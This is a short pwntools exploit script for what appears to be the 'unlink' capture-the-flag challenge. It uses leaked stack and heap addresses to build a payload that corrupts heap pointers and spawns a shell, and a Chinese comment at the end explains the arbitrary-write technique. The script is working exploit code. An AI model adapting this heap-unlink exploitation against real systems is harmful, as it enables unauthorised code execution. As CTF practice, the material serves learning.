from pwn import *


p = process('/home/unlink/unlink')

p.recvuntil('here is stack address leak: ')
stack = int(p.recvline(),16)
p.recvuntil('here is heap address leak: ')
heap = int(p.recvline(),16)
p.recv()

shellcode = p32(0x80484eb) + 'b'*12 + p32(heap+12)+p32(stack+0x10)
p.sendline(shellcode)
p.interactive()


'''
这题的关键在于main函数末尾的一段命令
结果是eip = esp = ecx-4 = [ebp-4]
ebp的内容和heap地址有关
而gets的缓冲区溢出可以覆盖B里面的两个指针，可以做到任意地址写入4字节
所以就只要将[ebp-4]修改成放在堆上的shell函数地址即可
也就是ecx-4 = &shell
至于为什么不能直接修改unlink返回地址，或者执行堆上的代码，见wp


https://www.jianshu.com/p/90c5e76cae2e
'''